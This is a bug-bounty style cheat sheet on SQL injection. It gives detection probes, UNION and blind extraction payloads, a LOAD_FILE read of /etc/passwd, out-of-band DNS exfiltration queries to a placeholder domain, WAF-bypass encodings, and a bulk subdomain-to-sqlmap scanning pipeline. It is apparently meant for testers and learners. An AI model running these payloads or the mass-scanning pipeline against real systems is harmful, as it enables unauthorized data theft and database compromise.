# SQL Injection (SQLi)

SQL Injection occurs when untrusted input is concatenated into a SQL query, letting an attacker alter the query's logic. It matters because even a "blind" instance can usually be turned into full data extraction, authentication bypass, or (with stacked queries / `load_file` / `OUTFILE`) code execution and access to other databases. Impact is typically critical: exposure of PII/payment data, auth bypass, or complete backend compromise.

## Hunting Checklist

1. Map every input that could touch the database: URL parameters, POST fields, JSON bodies, headers (User-Agent, Referer, X-Forwarded-For), cookies, login forms, search boxes, sort/filter parameters, and API endpoints.
2. Capture requests in Burp Suite, send them to Scanner, run an active scan, then manually verify with SQL payloads (scanner findings are frequently false positives).
3. Submit a single quote `'` (and `"`, `')`, `%`) and look for SQL error messages or a change in response behavior.
4. Submit SQL-specific query fragments, boolean conditions (`' or 1=1--` vs `' or 1=0--`), and compare responses.
5. Submit time-delay payloads (`sleep`, `WAITFOR DELAY`, `pg_sleep`) for blind cases.
6. Enumerate subdomains, collect URLs with waybackurls/gau, filter likely injectable parameters with `gf sqli`, and run sqlmap in bulk.
7. Hunt hidden parameters with Arjun and re-test them (`https://domain.com?<hiddenparam>=<value>`).
8. Test second-order SQLi: inject in fields that are stored and later used (profile updates, coupon codes, names) by triggering the consuming feature afterwards.
9. If a WAF blocks input, move through the Bypass Techniques section before giving up.
10. Automate/confirm with SQLMAP, using tamper scripts when a filter is present.

## Test Cases & Examples

### Detection probes

```sql
'
"
');
1' and '1'='1
1' and '1'='2
' or 1=1--
admin' --
" or ""="
'; WAITFOR DELAY '0:0:5'--
'; SELECT pg_sleep(5)--
```

### Error generation with untrusted input

1. Submit single quote character `'` & look for errors.
2. Submit SQL specific query.
3. Submit Boolean conditions such as `or 1=1` and `or 1=0`, and observe the application's response.
4. Submit certain payloads that result in time delay.

### Finding the number of columns (ORDER BY / GROUP BY / HAVING)

```sql
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
```

Increment the column index until an error occurs — the last working index is the column count.

### Finding vulnerable columns with UNION

```sql
' UNION SELECT NULL --
' UNION SELECT NULL, NULL --
' UNION SELECT NULL, NULL, NULL --
```

Using NULL maximizes the probability that the payload succeeds, because NULL can be converted to every commonly used data type. (Details: https://portswigger.net/web-security/sql-injection/union-attacks)

### Extracting basic database information

Database version:

```sql
-- Oracle
SELECT banner FROM v$version
SELECT version FROM v$instance
-- Microsoft
SELECT @@version
-- PostgreSQL
SELECT version()
-- MySQL
SELECT @@version
```

Database contents:

```sql
-- Oracle
SELECT * FROM all_tables
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
-- Microsoft / PostgreSQL / MySQL
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```

Version, user and database name in one shot:

```sql
' AND 1=2 UNION ALL SELECT concat_ws(0x3a,version(),user(),database())
```

Using `group_concat()` to concatenate all returned rows:

```sql
' union all select 1,2,3,group_concat(table_name),5,6 from information_schema.tables where table_schema=database()--
```

### Reading system files

```sql
' UNION ALL SELECT LOAD_FILE('/etc/passwd')
```

(Requires FILE privilege, absolute path, and a readable output column; advanced exploitation can continue via `INTO OUTFILE` / UDF where permitted.)

### Time delays (blind confirmation)

```sql
-- Oracle
SELECT dbms_pipe.receive_message(('a'),10) FROM dual
-- Microsoft
WAITFOR DELAY '0:0:10'
-- PostgreSQL
SELECT pg_sleep(10)
-- MySQL
SELECT sleep(10)
```

### Conditional / inferential time delays (blind data extraction)

```sql
-- Oracle
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
-- Microsoft
IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
-- PostgreSQL
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
-- MySQL
SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')
```

Example: `' AND (SELECT SUBSTRING(version(),1,1))='5' -- ` style true/false questions against `information_schema`.

### Out-of-band (OOB) exfiltration

```sql
-- Microsoft (DNS call-out)
'; DECLARE @q varchar(99); SET @q = '\\<your-oob-domain>\test'; EXEC master..xp_dirtree @q--
-- Oracle (DNS call-out)
'; SELECT UTL_INADDR.get_host_address('<your-oob-domain>') FROM dual--
```

Watch Collaborator/interactsh for DNS lookups when the response is blind.

## Bypass Techniques

### 1. Null byte before the SQL query

```sql
%00' UNION SELECT password FROM Users WHERE username-'xyz'--
```

### 2. SQL inline comment sequences to break up keywords

```sql
'/**/UN/**/ION/**/SEL/**/ECT/**/password/**/FR/**/OM/**/Users/**/WHE/**/RE/**/username/**/LIKE/**/'xyz'--
```

### 3. URL encoding (and double / hex encoding)

```bash
# examples
/ -> %2f
* -> %2a
# double-encode or hex-encode if single encoding fails
```

### 4. Case mangling (`UnIoN SeLeCt`) to defeat naive signature matching

### 5. Alternative syntax for the same logic

- Comments: `--`, `-- -`, `#`, `/* */`
- Whitespace alternatives: `%09 %0a %0b %0c %a0 /**/`
- Equivalent operators/functions: `||`/`OR`, `LIKE`/`REGEXP`/`RLIKE`, `=`/`<>`/`!=`, `substring`/`substr`/`mid`, `concat`/`concat_ws`/`group_concat`, hex/octal string encoding.

### 6. SQLMAP tamper scripts (WAF/IDS/IPS)

- Atlas (suggests tamper scripts): https://github.com/m4ll0k/Atlas
- Jason Haddix on tamper scripts: https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-and-waf-bypass/423
- OWASP WAF bypass reference: https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF

## Tools & Resources

- PortSwigger SQL injection cheat sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
- PortSwigger SQL injection lab track: https://portswigger.net/web-security/sql-injection
- Sublist3r / Findomain / Assetfinder — subdomain enumeration
- HTTPX — https://github.com/encode/httpx
- Waybackurls — https://github.com/tomnomnom/waybackurls
- Gau — https://github.com/lc/gau
- GF + patterns — https://github.com/tomnomnom/gf , https://github.com/1ndianl33t/Gf-Patterns
- Arjun (hidden parameters) — https://github.com/s0md3v/Arjun
- Hakrawler — https://github.com/hakluke/hakrawler
- SQLMAP + `--tamper`, `--dbms`, `--technique`, `--threads`

Bulk pipeline example:

```bash
sublist3r -d target | tee -a domains        # findomain/assetfinder also work
cat domains | httpx | tee -a alive
cat alive | waybackurls | tee -a urls
gf sqli urls >> sqli
sqlmap -m sqli --dbs --batch                 # add tamper scripts as needed
```

Hidden-parameter pipeline: enumerate subdomains → collect URLs (hakrawler/waybackurls/gau) → `arjun --urls urls.txt` → test `https://domain.com?<hiddenparam>=<value>` → save requests to file → sqlmap `-r`.

Source thread for the recon pipeline: https://twitter.com/El3ctr0Byt3s/status/1302706241240731649

## Report Tips

- Frame impact concretely: rows of user/PII/payment records extracted, admin auth bypass, or files read — not just "parameter is injectable".
- For blind/time-based findings, include proof that correlates with your input (e.g., `pg_sleep(10)` timing or OOB DNS hit) since nothing renders in the response.
- Note if the same injection point is reachable unauthenticated and whether stacked queries/`load_file`/OOB worked — these escalate severity.

---
*Author: [@xhan1x](https://twitter.com/xhan1x)*
